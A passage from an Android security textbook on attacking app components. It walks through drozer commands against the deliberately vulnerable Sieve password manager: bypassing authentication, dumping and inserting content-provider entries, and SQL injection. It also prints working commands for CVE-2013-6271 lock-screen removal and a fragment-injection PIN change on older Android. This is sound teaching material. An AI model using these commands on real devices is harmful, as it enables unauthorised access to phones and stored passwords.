from other applications. Before\nexamining this code in search of vulnerabilities, you must fully understand intents themselves.\nA Closer Look at Intents\nAn intent is a data object that loosely defines a task to be performed. It can contain data and all relevant\ninformation about the action to be performed on the data or only have a single field of information in it. An\nintent can be sent to different exported components to start or interact with them. To start an activity, an intent\ncan be sent with the startActivity(Intent) method from the Context class. In a similar way,\nsendBroadcast(Intent) and startService(Intent) can be used to interact with broadcast receivers and services.\nAn intent object is generic and not specific to the type of component receiving it.\nAndroid offers two fundamentally different types of intents: explicit and implicit intents. Explicit intents directly\nstate the component that must receive the intent. You do this using the setComponent() or setClass() methods\non an intent object. Stating the component that must receive the intent bypasses the intent resolution process\nthe OS can undertake and directly delivers the intent to the specified component.\nOn the other hand, an implicit intent does not state the component to which it must be delivered. Rather, it\nrelies on the OS to determine the possible candidate(s) where the intent can be delivered. For instance, multiple\napplications on a device may be capable of handling MP3 music files and if more than one choice exists, then an\napplication chooser activity may be displayed to the user to ask which application to deliver the intent to. This\nintent resolution process relies on the matching of the presented intent against all the relevant intent filters\ndefined by installed applications. Intents can be matched against intent filters using three types of information:\nAction\nData\nCategory\nWhen defining an intent filter, specifying an action element is compulsory. Intent filters can catch relevant data\nin many different ways, for instance:\nScheme—This is the scheme of any URI. For example, on https://www.google.com, the scheme is https.\nHost—This is the host portion of a URI. For example, on https://www.google.com, the host is\nwww.google.com.\nPort—This is the port portion of a URI. This can catch URIs that target a specific port.\nPath, pathPrefix, and pathPattern—These can be used to match any part of the data to a desired value.\nMimeType—This defines a specific MIME type for the data that is specified inside the intent.\nA component to which you, as an attacker, have sent an intent may be looking for any one of the preceding\nrequirements. This is why when you examine an exported component, reviewing the code that handles incoming\nintents is important. As food for thought, what if a malicious application had to define an intent filter for a\nparticular intent that is known to contain sensitive information in it? Maybe this malicious application would be\nable to receive it. We explore this in greater detail later in this chapter under “Intent Sniffing”. The sending of\ncrafted intents for each component is also explored in their relevant sections. A utility named am is present on\neach Android device that allows the crafting and sending of intents to defined application components. A\nshortened version of the usage of am is shown here:\nshell@android:/ $ am\nusage: am [subcommand] [options]\nusage: am start [-D] [-W] [-P <FILE>] [--start-profiler <FILE>]\n[--R COUNT] [-S] [--opengl-trace]\n[--user <USER_ID> | current] <INTENT>\nam startservice [--user <USER_ID> | current] <INTENT>\nam stopservice [--user <USER_ID> | current] <INTENT>\n...\nam broadcast [--user <USER_ID> | all | current] <INTENT>\n...\nam start: start an Activity. Options are:\n-D: enable debugging\n-W: wait for launch to complete\n--start-profiler <FILE>: start profiler and send results to <FILE>\n-P <FILE>: like above, but profiling stops when app goes idle\n-R: repeat the activity launch <COUNT> times. Prior to each repeat,\nthe top activity will be finished.\n-S: force stop the target app before starting the activity\n--opengl-trace: enable tracing of OpenGL functions\n--user <USER_ID> | current: Specify which user to run as; if not\nspecified then run as the current user.\nam startservice: start a Service. Options are:\n--user <USER_ID> | current: Specify which user to run as; if not\nspecified then run as the current user.\nam stopservice: stop a Service. Options are:\n--user <USER_ID> | current: Specify which user to run as; if not\nspecified then run as the current user.\n...\nam broadcast: send a broadcast Intent. Options are:\n--user <USER_ID> | all | current: Specify which user to send to; if not\nspecified then send to all users.\n--receiver-permission <PERMISSION>: Require receiver to hold\npermission.\n...\n<INTENT> specifications include these flags and arguments:\n[-a <ACTION>] [-d <DATA_URI>] [-t <MIME_TYPE>]\n[-c <CATEGORY> [-c <CATEGORY>] ...]\n[-e|--es <EXTRA_KEY> <EXTRA_STRING_VALUE> ...]\n[--esn <EXTRA_KEY> ...]\n[--ez <EXTRA_KEY> <EXTRA_BOOLEAN_VALUE> ...]\n[--ei <EXTRA_KEY> <EXTRA_INT_VALUE> ...]\n[--el <EXTRA_KEY> <EXTRA_LONG_VALUE> ...]\n[--ef <EXTRA_KEY> <EXTRA_FLOAT_VALUE> ...]\n[--eu <EXTRA_KEY> <EXTRA_URI_VALUE> ...]\n[--ecn <EXTRA_KEY> <EXTRA_COMPONENT_NAME_VALUE>]\n[--eia <EXTRA_KEY> <EXTRA_INT_VALUE>[,<EXTRA_INT_VALUE...]]\n[--ela <EXTRA_KEY> <EXTRA_LONG_VALUE>[,<EXTRA_LONG_VALUE...]]\n[--efa <EXTRA_KEY> <EXTRA_FLOAT_VALUE>[,<EXTRA_FLOAT_VALUE...]]\n[-n <COMPONENT>] [-f <FLAGS>]\n[--grant-read-uri-permission] [--grant-write-uri-permission]\n[--debug-log-resolution] [--exclude-stopped-packages]\n[--include-stopped-packages]\n[--activity-brought-to-front] [--activity-clear-top]\n[--activity-clear-when-task-reset] [--activity-exclude-from-recents]\n[--activity-launched-from-history] [--activity-multiple-task]\n[--activity-no-animation] [--activity-no-history]\n[--activity-no-user-action] [--activity-previous-is-top]\n[--activity-reorder-to-front] [--activity-reset-task-if-needed]\n[--activity-single-top] [--activity-clear-task]\n[--activity-task-on-home]\n[--receiver-registered-only] [--receiver-replace-pending]\n[--selector]\n[<URI> | <PACKAGE> | <COMPONENT>]\nSending intents using either am or drozer will be shown in each of the sections. You can find the official Android\ndocumentation on intents at the following address: http://developer.android.com/guide/components/intents-\nfilters.html. Let us get started on attacking application components.\nNOTE\nThis chapter makes heavy use of drozer. The standard drozer application that is used for testing has only a\nsingle permission requested: android.permission.INTERNET. This permission is requested so that drozer\ncan make use of the network to communicate with the Python client. Intentionally, no other permissions\nare requested by drozer by default. If it is possible to perform an unintended action on another application\nfrom drozer, then the vulnerability poses a greater threat than an application that has requested the\npermission to do so. This reiterates the fact that if a user does not review the permissions being requested\nwhen installing an application, there can be no reasonable presumption of being secure against attack.\nIntroducing Sieve: Your First Target Application\nVarious Android training applications have been created that contain intentional vulnerabilities. This is to\nfacilitate learning of the types of vulnerabilities that can exist in an application. Many such applications are\navailable with varying degrees of usefulness for a beginner.\nMuch of this chapter makes use of a vulnerable application created by Matthew Uzzell and Daniel Bradberry\nfrom MWR InfoSecurity, named Sieve. You can download it alongside drozer at the following address:\nhttps://www.mwrinfosecurity.com/products/drozer/community-edition/. Sieve is a password manager that\nallows a user to save usernames and passwords for any online service in a “secure” manner. It makes use of a\nmaster password and PIN defined by the user and encrypts password entries in its database. On the surface, it\nmeets all the requirements for being a secure password manager, but after you dig deeper you will see that the\nsecurity provided is broken in many ways. A user who has configured Sieve is presented with a password prompt\nwhen logging in after device power up and then a PIN prompt thereafter. Figure 7.2 shows screenshots of Sieve.\nFigure 7.2 The vulnerable Sieve password manager application\nAfter you install it, you can find the package name of Sieve by using the app .package.info module with a filter\nfor the word Sieve, which is the application label associated with its launcher icon.\ndz> run app.package.list -f Sieve\ncom.mwr.example.sieve (Sieve)\nYou can examine exported application components of Sieve in its manifest using one of several tools shown in\nChapter 6. Inside drozer, you can use the following method:\ndz> run app.package.manifest com.mwr.example.sieve\n<manifest versionCode=\"1\"\nversionName=\"1.0\"\npackage=\"com.mwr.example.sieve\">\n<uses-permission name=\"android.permission.READ_EXTERNAL_STORAGE\">\n</uses-permission>\n<uses-permission name=\"android.permission.WRITE_EXTERNAL_STORAGE\">\n</uses-permission>\n<uses-permission name=\"android.permission.INTERNET\">\n</uses-permission>\n<permission label=\"Allows reading of the Key in Sieve\"\nname=\"com.mwr.example.sieve.READ_KEYS\"\nprotectionLevel=\"0x1\">\n</permission>\n<permission label=\"Allows editing of the Key in Sieve\"\nname=\"com.mwr.example.sieve.WRITE_KEYS\"\nprotectionLevel=\"0x1\">\n</permission>\n<uses-sdk minSdkVersion=\"8\"\ntargetSdkVersion=\"17\">\n</uses-sdk>\n<application theme=\"@2131099649\"\nlabel=\"@2131034112\"\nicon=\"@2130837504\"\ndebuggable=\"true\"\nallowBackup=\"true\">\n<activity label=\"@2131034127\"\nname=\".FileSelectActivity\"\nexported=\"true\"\nfinishOnTaskLaunch=\"true\"\nclearTaskOnLaunch=\"true\"\nexcludeFromRecents=\"true\">\n</activity>\n<activity label=\"@2131034112\"\nname=\".MainLoginActivity\"\nexcludeFromRecents=\"true\"\nlaunchMode=\"2\"\nwindowSoftInputMode=\"0x14\">\n<intent-filter>\n<action name=\"android.intent.action.MAIN\">\n</action>\n<category name=\"android.intent.category.LAUNCHER\">\n</category>\n</intent-filter>\n</activity>\n<activity label=\"@2131034121\"\nname=\".PWList\"\nexported=\"true\"\nfinishOnTaskLaunch=\"true\"\nclearTaskOnLaunch=\"true\"\nexcludeFromRecents=\"true\">\n</activity>\n<activity label=\"@2131034122\"\nname=\".SettingsActivity\"\nfinishOnTaskLaunch=\"true\"\nclearTaskOnLaunch=\"true\"\nexcludeFromRecents=\"true\">\n</activity>\n<activity label=\"@2131034123\"\nname=\".AddEntryActivity\"\nfinishOnTaskLaunch=\"true\"\nclearTaskOnLaunch=\"true\"\nexcludeFromRecents=\"true\">\n</activity>\n<activity label=\"@2131034124\"\nname=\".ShortLoginActivity\"\nfinishOnTaskLaunch=\"true\"\nclearTaskOnLaunch=\"true\"\nexcludeFromRecents=\"true\">\n</activity>\n<activity label=\"@2131034125\"\nname=\".WelcomeActivity\"\nfinishOnTaskLaunch=\"true\"\nclearTaskOnLaunch=\"true\"\nexcludeFromRecents=\"true\">\n</activity>\n<activity label=\"@2131034126\"\nname=\".PINActivity\"\nfinishOnTaskLaunch=\"true\"\nclearTaskOnLaunch=\"true\"\nexcludeFromRecents=\"true\">\n</activity>\n<service name=\".AuthService\"\nexported=\"true\"\nprocess=\":remote\">\n</service>\n<service name=\".CryptoService\"\nexported=\"true\"\nprocess=\":remote\">\n</service>\n<provider name=\".DBContentProvider\"\nexported=\"true\"\nmultiprocess=\"true\"\nauthorities=\"com.mwr.example.sieve.DBContentProvider\">\n<path-permission readPermission=\"com.mwr.example.sieve.READ_KEYS\"\nwritePermission=\"com.mwr.example.sieve.WRITE_KEYS\"\npath=\"/Keys\">\n</path-permission>\n</provider>\n<provider name=\".FileBackupProvider\"\nexported=\"true\"\nmultiprocess=\"true\"\nauthorities=\"com.mwr.example.sieve.FileBackupProvider\">\n</provider>\n</application>\n</manifest>\nTo see a shortened summary of the exported components, use the app.package .attacksurface module, shown\nhere:\ndz> run app.package.attacksurface com.mwr.example.sieve\nAttack Surface:\n3 activities exported\n0 broadcast receivers exported\n2 content providers exported\n2 services exported\nis debuggable\nThe rest of this chapter explores each of these application components (in addition to many other aspects of the\napplication’s security).\nExploiting Activities\nActivities are the graphical user interface of an application for the user. As such, they control the user input into\nfunctionality and have a direct impact on the security of an application. An application typically contains many\ndifferent activities. Some may be exported and others may only be intended to be started by other code inside\nthe same application and not directly exported.\nConsider an application that has a login activity. This activity and its underlying code are responsible for\nchecking whether the correct password is entered. According to this check, the code may launch another activity\nwith authenticated content and functionality.\nUnprotected Activities\nWhat if the developer exported all the activities, including the ones that provide authenticated functionality?\nThis means that another application on the device, or a user interacting with the device, will be able to launch\nthe authenticated activity directly.\nExamining all the activities exported by the Sieve application reveals the following:\ndz> run app.activity.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\ncom.mwr.example.sieve.FileSelectActivity\nPermission: null\ncom.mwr.example.sieve.MainLoginActivity\nPermission: null\ncom.mwr.example.sieve.PWList\nPermission: null\nThis shows three exported activities that do not require any permissions from the caller to be interacted with.\nThe main activity of an application has to be exported so that it can be started when the launcher icon is clicked.\nIt always has an intent filter that looks as follows:\n<intent-filter>\n<action android:name=\"android.intent.action.MAIN\"/>\n<category android:name=\"android.intent.category.LAUNCHER\" />\n</intent-filter>\nYou can find this activity by examining the manifest of the application or using the app.package.launchintent\nmodule. Here is the latter method:\ndz> run app.package.launchintent com.mwr.example.sieve\nLaunch Intent:\nAction: android.intent.action.MAIN\nComponent:\n{com.mwr.example.sieve/com.mwr.example.sieve.MainLoginActivity}\nData: null\nCategories:\n- android.intent.category.LAUNCHER\nFlags: [ACTIVITY_NEW_TASK]\nMime Type: null\nExtras: null\nWhen a user has opened Sieve previously, launching the application shows an activity requesting the user’s PIN.\nThis leaves you with two other exported activities that can be started. Systematically invoke each exported\nactivity using drozer and the app.activity.start module as follows:\ndz> run app.activity.start --component <package_name> <full_activity_name>\nIn the case of the PWList activity in the Sieve application, the following command opens the exported activity:\ndz> run app.activity.start --component com.mwr.example.sieve\ncom.mwr.example.sieve.PWList\nThis reveals all the accounts held by the password manager without having to enter the PIN. Figure 7.3 shows\nthe launched activity.\nFigure 7.3 Exported activity that leads to the disclosure of all accounts within Sieve\nThis direct authentication bypass of this application occurs by invoking one command. In addition to simply\nstarting each exposed activity, you should review the onCreate() method of each in search of conditional\nstatements that may lead to other code paths or unexpected behavior. You can never know what kinds of Easter\neggs are hiding in this method that could cause the application to perform an action that is completely out of\ncharacter, like taking one of the parameters from the intents and using it as part of an operating system\ncommand that it executes. You may think that this is unlikely and contrived, but through your adventures with\nreversing and bug hunting on Android you will see stranger things.\nNOTE ABOUT ACTIVITY ALIASES\nIn the Android manifest it is possible to declare an <activity-alias>. This acts like a proxy to another\nactivity that has already been defined in the same application. The activity that the alias represents is\ndefined by the android:targetActivity attribute in the <activity-alias> tag. An example of this\ndeclaration is shown here:\n<activity-alias android:name=\".AliasTest\"\nandroid:targetActivity=\".WelcomeActivity\"\nandroid:exported=\"true\">\n</activity-alias>\nThe interesting thing about aliases is that they can also allow access to activities that are not exported.\nAccess to the target activity depends on how the alias is exported, which can be done explicitly or through\nthe use of intent filters. When using the app.activity.info module in drozer, an activity alias can be\nspotted by the extra entry stating the Target Activity. A ficticious example output of the app\n.activity.info module if Sieve used the previously defined activity alias is shown here:\ndz> run app.activity.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\n...\ncom.mwr.example.sieve.AliasTest\nPermission: null\nTarget Activity: com.mwr.example.sieve.WelcomeActivity\n...\nActivities are also capable of sending information back to the caller when they finish(). This can be done by\nusing the setResult()function, which can contain an intent with any information that the activity wants to send\nback to the caller. If the calling application started the activity using startActivityForResult()rather than\nstartActivity()then the intent received from the started activity can be caught inside the overridden\nonActivityResult()callback. Checking whether an activity sends a result back is as simple as checking for the\nexistence of the keyword setResult in the activity’s code.\nBecause activities that are not exported can still be started by a privileged user, a user who has privileged access\nto a device can use this access to perform all kinds of authentication bypass tricks on installed applications. This\nattack vector may be limited due to this requirement but will be explored anyway. To find the activities that are\nnot exported by an application, you can examine the manifest or use the -u flag on the app.activity.info\nmodule. For example, on the Sieve application the output is as follows:\ndz> run app.activity.info -a com.mwr.example.sieve -u\nPackage: com.mwr.example.sieve\nExported Activities:\ncom.mwr.example.sieve.FileSelectActivity\nPermission: null\ncom.mwr.example.sieve.MainLoginActivity\nPermission: null\ncom.mwr.example.sieve.PWList\nPermission: null\nHidden Activities:\ncom.mwr.example.sieve.SettingsActivity\nPermission: null\ncom.mwr.example.sieve.AddEntryActivity\nPermission: null\ncom.mwr.example.sieve.ShortLoginActivity\nPermission: null\ncom.mwr.example.sieve.WelcomeActivity\nPermission: null\ncom.mwr.example.sieve.PINActivity\nPermission: null\nAfter examining the application’s behavior and code further, an interesting activity for an attacker to start would\nbe the SettingsActivity. This activity allows the attacker to get to the Settings menu and conveniently back up\nthe password database to the SD card. To launch this activity from a root ADB shell, use the following\ncommand:\nroot@generic:/ # am start -n com.mwr.example.sieve/.SettingsActivity\nStarting: Intent { cmp=com.mwr.example.sieve/.SettingsActivity }\nThe fact that an activity is not exported means only that it cannot be interacted with by a non-privileged caller.\nTo protect against this, an additional authentication mechanism could be used on the Sieve application. Chapter\n9 covers how additional protections can be put in place.\nREAL-WORLD EXAMPLE: CVE-2013-6271 REMOVE DEVICE LOCKS FROM ANDROID\n4.3 OR EARLIER\nOn November 27, 2013, Curesec (http://www.curesec.com) disclosed a vulnerability on its blog that\nallowed the lock screen to be cleared without the appropriate user interaction on Android devices prior to\nversion 4.4. The vulnerability existed in the com.android.settings.ChooseLockGeneric class that handled\nwhether a screen lock is enabled or not and which type to use (pin, password, gesture, and so on). A code\npath was discovered in this activity that can be reached by sending an intent from any application that\ncompletely disables the lock screen mechanism.\nYou can exploit this vulnerability from ADB as follows:\nshell@android:/ $ am start -n com.android.settings/com.android.settings.\nChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_\ntype 0 --activity-clear-task\nStarting: Intent { flg=0x8000 cmp=com.android.settings/.ChooseLockGeneric\n(has extras) }\nFigure 7.4 shows a device’s lock before and after the preceding command is executed.\nThis vulnerability can be exploited from any application on the device and does not depend on any\nprerequisites.\nFigure 7.4 Device lock screen requiring a password and then this being removed after the exploit is run\nTapjacking\nOn December 9, 2010, Lookout discussed an attack vector named tapjacking at\nhttps://blog.lookout.com/look-10-007-tapjacking/. This is essentially the mobile equivalent of the\nclickjacking web vulnerability (also known as UI redressing). Tapjacking is when a malicious application\noverlays a fake user interface over another application’s activity to trick users into clicking on something they\ndid not intend to.\nThis is possible using a UI feature called toasts. Toasts are usually used to display small pieces of information to\nthe user without the ability for the user to interact with it. It is meant to be non-intrusive and transparently\noverlays any activity that the user has open at that time. However, these toasts can be completely customized\nand made to fill the entire screen with a design that makes it look like a proper activity. The dangerous part is\nthat if the user attempts to click on something on this new “activity,” their input still gets received by the activity\nthat is beneath the toast. This means that it is possible to trick a user into clicking on part of an activity that is\nnot visible. How effective this attack is depends on the creativity of the attacker.\nAn overoptimistic example of performing this attack may be for a malicious application to open the Play Store\nactivity and trick the user into installing an application. Remember that any application can start an exported\nactivity and all launcher activities of installed applications are exported due to their intent filters. The attacker’s\napplication may open the Play Store and then immediately initiate a sequence of custom toasts that display a\ngame to the user, or some sequence of screen taps that the user needs to perform in order to exit the “user\ninterface” or “win the game.” All the while, the placement of each item ensures the user’s taps are performing\nactions on the Play Store in the background. Figure 7.5 illustrates how the placement of fictitious clickable items\ncould be used to install a new application.\nFigure 7.5 An illustration of how a toast could be used to perform unintended actions on underlying activities\nTesting for this issue in your application can be done using a proof-of-concept application created by Caitlin\nHarrison of MWR InfoSecurity. It allows you to configure a customized toast that gets displayed on the screen\nat a specified position. This code runs in a service in the background and allows you to navigate to your target\napplication and test whether you can still interact with the underlying activities of the application while the\ntoast is being displayed. This application can be downloaded from https://github.com/mwrlabs/tapjacking-\npoc.\nSearching the application’s Dalvik Executable (classes.dex) and application resources for instances of the word\nfilterTouchesWhenObscured may also indicate that the activities being tested are not vulnerable to this attack.\nChapter 9 explores more on securing an activity against this type of attack.\nNOTE\nSome device vendors have mitigated tapjacking at an OS level. For instance, Samsung devices running\nAndroid versions Ice Cream Sandwich and later do not allow any touches to reach an underlying activity\nwhen there is a toast present on the screen, regardless of whether the filterTouchesWhenObscured\nattribute is set or not.\nRecent Application Screenshots\nAndroid stores a list of recently used applications, shown in Figure 7.6, that can be accessed by long-clicking the\nhome button.\nFigure 7.6 The recent applications being shown on a device\nThe thumbnails associated with each of these entries are a screenshot of the last activity shown before the\napplication was closed. Depending on the application, this could display sensitive information to an attacker\nwho has compromised the device and has privileged access. These thumbnails are not stored on disk like on iOS\nand can only be retrieved from memory by an attacker with privileged access. You can find the particular class\nthat stores these screenshots in the Android source at\nhttps://github.com/android/platform_frameworks_base/blob/master/services/java/com/android/server/am/TaskRecord.java0\nand it extends the class found at https://github.com/gp-\nb2g/frameworks_base/blob/master/services/java/com/android/server/am/ThumbnailHolder.java.\nAllowing the OS to take application screenshots of activities is somewhat of a low-risk issue but may be\nimportant depending on the sensitivity of the information displayed by an application. Chapter 9 provides\ntechniques for stopping activities from displaying sensitive information in these screenshots.\nFragment Injection\nAn activity can contain smaller UI elements named fragments. They can be thought of as “sub activities” that\ncan be used to swap out sections of an activity and help facilitate alternate layouts for different screen sizes and\nform factors that an Android application can run on.\nOn December 10, 2013, Roee Hay from IBM Security Systems publicized a vulnerability that affected all\napplications with exported activities that extend the PreferenceActivity class. In the onCreate() method of the\nPreferenceActivity class, it was discovered to be retrieving an extra named :android:show_fragment from the\nuser-supplied bundle. This extra can be provided by the application that sent the intent and the name of a\nfragment within the target application specified to be loaded. This allows the loading of any chosen fragment\nwithin the activity, which may have only been used inside non-exported activities under normal use. This may\nreveal functionality that was not intended by the developer.\nAll exported activities that extend PreferenceActivity and are running on Android 4.3 or prior are vulnerable.\nThis attack was mitigated by Android in versions 4.4 onward by providing a new method in the\nPreferenceActivity class named isValidFragment() to allow developers to override it and validate which\nfragments can be loaded inside the activity. Performing poor validation on the fragment name supplied to this\nmethod or simply returning true in this method without performing any checks would still result in fragment\ninjection attacks being possible. More information on how to implement correct checking is given in Chapter 9.\nREAL-WORLD EXAMPLE: CHANGE PIN CODE ON DEVICE WITHOUT PROVIDING THE\nEXISTING ONE\nRoee Hay demonstrated the fragment injection vulnerability that existed in the standard Android Settings\napplication. It was possible to use a crafted intent to invoke the Settings activity and provide the\nChooseLockPassword$ChooseLockPasswordFragment fragment as an argument. This particular fragment\nallows the user to change the device’s PIN without providing the existing one. Starting the vulnerable\nactivity with the following intent from drozer initiates this attack and allows you to change the PIN on a\ndevice running Android 4.3 or earlier.\ndz> run app.activity.start --component com.android.settings\ncom.android.settings.Settings --extra string :android:show_fragment\ncom.android.settings.ChooseLockPassword$ChooseLockPasswordFragment --extra boolean\nconfirmcredentials false\nAfter tapping the Back button once, you will see an activity that looks like Figure 7.7 where you can specify\na new PIN code for the device.\nFigure 7.7 Fragment loaded inside the Settings activity that allows the PIN to be changed without\nproviding the existing one\nTrust Boundaries\nAndroid application components are very modular and can be controlled from any part of the application code\nusing intents. This means that no default boundaries exist between any sections of the code. When you consider\nan application that has a login screen, controlling access to functionality that is only supposed to be accessible to\na “logged in” user is completely dependent on how the application was designed. Developers have the freedom\nto implement authentication mechanisms in any way they want.\nSieve contains an example of a failed trust boundary in the main login activity. A user who has not entered his\npassword yet to log in to the application can still access the settings, as shown in Figure 7.8.\nFigure 7.8 Sieve allows the Settings activity to be opened without logging in\nThis Settings menu contains features that will allow an attacker to compromise the password database without\never knowing the application’s password. This functionality was clearly only intended to be used once the user\nwas authenticated; however, it was exposed in an untrusted activity. Such flaws can often easily be exposed by\ninvoking activities that are not actually exported by an application. Performing an attack of this nature using an\nADB root shell was discussed earlier in this section.\nExploiting Insecure Content Providers\nThe security of content providers has a notorious past on Android, because they often hold an application’s most\nsensitive data and many application developers have not properly secured them. These vulnerabilities were\npartially because of Android’s reverse logic on content providers in regard to how they are exported by default.\nContent providers were the only application component that was exported by default on Android, but this\nsituation has since been amended in API version 17. Note that the default behavior is still to export a content\nprovider if the android:targetSdkVersion is set to a value smaller than 17, and so these issues are still prevalent.\nUnprotected Content Providers\nA common root cause of content provider problems is the fact that they are not explicitly marked as\nexported=\"false\" in their manifest declarations because the assumption is that they follow the same default\nexport behavior as other components. At the time of writing, many applications still target SDK versions lower\nthan API 17 (which equates to Android 4.1). This means that if exported=\"false\" is not explicitly stated on the\ncontent provider declaration in the manifest, it is exported.\nSeveral drozer modules help you gather information about exported content providers and then allow you to\ninteract with them. On the Sieve application, you can retrieve information about the content providers using the\nfollowing:\ndz> run app.provider.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\nAuthority: com.mwr.example.sieve.DBContentProvider\nRead Permission: null\nWrite Permission: null\nContent Provider: com.mwr.example.sieve.DBContentProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: False\nPath Permissions:\nPath: /Keys\nType: PATTERN_LITERAL\nRead Permission: com.mwr.example.sieve.READ_KEYS\nWrite Permission: com.mwr.example.sieve.WRITE_KEYS\nAuthority: com.mwr.example.sieve.FileBackupProvider\nRead Permission: null\nWrite Permission: null\nContent Provider: com.mwr.example.sieve.FileBackupProvider\nMultiprocess Allowed: True\nGrant Uri Permissions: False\nThis reveals that two content providers don’t require any permissions for users who want to read from or write\nto them. However, the DBContentProvider requires that users have permissions to read from or write to the\n/Keys path.\nThe output of this module does not give the exact full content URIs that can be queried. However, a good\nstarting point would be to try the root path and defined /Keys path. For a view of all the available paths, review\nthe implemented query()method and peripheral source code for the content provider or use the\napp.provider.finduri module in drozer. This module is not comprehensive and checks only for strings inside\nthat DEX file that begin with content://. This check may miss the large majority of available paths and should\nnot be relied upon. Running it against the Sieve package reveals the following content URIs:\ndz> run app.provider.finduri com.mwr.example.sieve\nScanning com.mwr.example.sieve...\ncontent://com.mwr.example.sieve.DBContentProvider/\ncontent://com.mwr.example.sieve.FileBackupProvider/\ncontent://com.mwr.example.sieve.DBContentProvider\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords/\ncontent://com.mwr.example.sieve.DBContentProvider/Keys/\ncontent://com.mwr.example.sieve.FileBackupProvider\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords\ncontent://com.mwr.example.sieve.DBContentProvider/Keys\nIn this case it did a good job of finding available content URI paths; however, you should not get into the habit\nof relying solely on it. Running this module led to the discovery of a completely new path that you could not\nhave anticipated by observing the initial information on the content provider. The newly discovered path is\n/Passwords. This does not have any permissions protecting it, and querying this URI leads to the disclosure of\nall the accounts stored in this password manager. Here is the command for querying this content URI:\ndz> run app.provider.query\ncontent://com.mwr.example.sieve.DBContentProvider/Passwords\n| _id | service | username | password | email |\n| 1 | Gmail | tyrone | zA76WR9mURDNNEw4TUiidVKRuKLEamg5h\n84T (Base64-encoded) | tyrone@gmail.com |\n| 2 | Internet Banking | tyrone123 |\nVJL7zoQdEeyeYQB2/DArlNv3G1m+fpWCEkg3TFUpUUti (Base64-encoded) |\ntyrone@gmail.com |\nThis leaks all the password entries for each of the corresponding services in this content provider. The developer\nof this application was clever and encrypted or obfuscated the password field. This encryption is\nimplementation-specific and was explicitly added by the developer. Sometimes encryption is not used at all and\naccess to sensitive information is obtained directly.\nAn interesting idea for an attacker would be to insert new entries or update existing ones in another\napplication’s content provider. This could open new attack avenues depending on what the application database\nis used for. To insert a new entry into the content provider shown previously, you can use the app\n.provider.insert module in drozer. The following code demonstrates how to add a new entry to Sieve’s\npassword database:\ndz> run app.provider.insert content://com.mwr.example.sieve\n.DBContentProvider/Passwords --integer _id 3\n--string service Facebook --string username tyrone\n--string password zA76WR9mURDNNEw4TUiidVKRuKLEamg5h84T\n--string email tyrone@gmail.com\nDone.\nThe Facebook service is now added using the app.provider.insert command and was added with the same\npassword as the Gmail service (whatever that may be).\nNOTE\nAndroid versions after and including 4.1.1 Jelly Bean contain a script that can be used to interact with\ncontent providers located at /system/bin/content. The following example uses it in the same manner as\ndrozer to query the exposed content provider:\nshell@android:/ $ content query --uri content://com.mwr.example.sieve.DB\nContentProvider/Passwords\nRow: 0 _id=1, service=Gmail, username=tyrone, password=BLOB, email=tyron\ne@gmail.com\nRow: 1 _id=2, service=Internet Banking, username=tyrone123, password=BLO\nB, email=tyrone@gmail.com\nThis can be run only from an ADB shell and not inside an application because it is protected by the\nandroid.permission.ACCESS_CONTENT_PROVIDERS_EXTERNALLY permission, which has a protection level of\nsignature defined by the android package.\nAll content providers whether they are exported or not can be queried from a privileged context. To find content\nproviders inside the default Android Clock package that have not been exported, you can use the -u flag on\napp.provider .info:\ndz> run app.provider.info -a com.android.deskclock -u\nPackage: com.android.deskclock\nExported Providers:\nHidden Providers:\nAuthority: com.android.deskclock\nRead Permission: null\nWrite Permission: null\nContent Provider: com.android.deskclock.provider.ClockProvider\nMultiprocess Allowed: False\nGrant Uri Permissions: False\nConfirming this in the application manifest reveals that this content provider is explicitly not exported.\n<provider name=\".provider.ClockProvider\"\nexported=\"false\"\nauthorities=\"com.android.deskclock\">\nAttempting to query this content provider from drozer results in an error saying that it is not exported.\ndz> run app.provider.query content://com.android.deskclock/alarms/\nPermission Denial: opening provider com.android.deskclock.provider.Clock\nProvider from ProcessRecord{b2084228 1741:com.mwr.dz:remote/u0a64}\n(pid=1741, uid=10064) that is not exported from uid 10020\nHowever, querying the same content provider from a root ADB shell is successful.\nroot@generic:/ # content query --uri content://com.android.deskclock/ala\nrms/\nRow: 0 _id=1, hour=8, minutes=30, daysofweek=31, enabled=0, vibrate=0, l\nabel=, ringtone=NULL, delete_after_use=0\nRow: 1 _id=2, hour=9, minutes=0, daysofweek=96, enabled=0, vibrate=0, la\nbel=, ringtone=NULL, delete_after_use=0\nThe attack vector in this case may be limited but it may be interesting to know.\nSQL Injection\nA commonly implemented technique with content providers is to connect them directly with an SQLite\ndatabase. This makes sense because the structures and methods used on content providers—with methods like\ninsert, update, delete, and query (which may be akin to select statements)—feel very similar to SQL’s. If you are\nfamiliar with finding vulnerabilities in web applications, you may immediately know what is coming. If input\ninto a content provider that is backed by an SQLite database is not sanitized or white-listed appropriately, then it\nmay be vulnerable to SQL injection—injecting arbitrary SQL commands in a variable that is used inside a SQL\nstatement. In the following code, examine the arguments of a query method on a content provider:\nfinal Cursor query(\nUri uri,\nString[] projection,\nString selection,\nString[] selectionArgs,\nString sortOrder);\nThe uri is the full path of the content URI being queried. The following format is expected of a content URI:\ncontent://authority/path.\nThe rest of the parameters can be better explained by using them inside a SQL query:\nselect projection from table_name(uri) where selection=selectionArgs ord\ner by sortOrder\nThis means that the following arguments in the query method may result in the following SQL query:\nfinal Cursor query(\nUri.parse(\"content://settings/system\"),\nnull,\nnull,\nnull,\nnull);\nQuery: select * from system\nAttempting a SQL injection attack in the projection parameter looks as follows:\nfinal Cursor query(\nUri.parse(\"content://settings/system\"),\nnew String[] {\"* from sqlite_master--\"},\nnull,\nnull,\nnull);\nQuery: select * from sqlite_master--* from system\nThe dash characters appended to the projection ensure that the rest of the query is commented out and a valid\nquery is still formed by this injection. Now try to find whether a SQL injection exists in the /Passwords path in\nthe DBContentProvider of Sieve. First look to determine whether an injection point exists in the projection\nparameter.\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProv\nider/Passwords --projection \"'\"\nunrecognized token: \"' FROM Passwords\" (code 1): , while compiling: SELE\nCT ' FROM Passwords\nInjecting a single quote into the projection causes an error in the structure of the query that SQLite received.\nYou can now use this injection point to find all the tables available in the same SQLite database by using a\nprojection of * from sqlite_master where type='table'--. This is shown in the following code 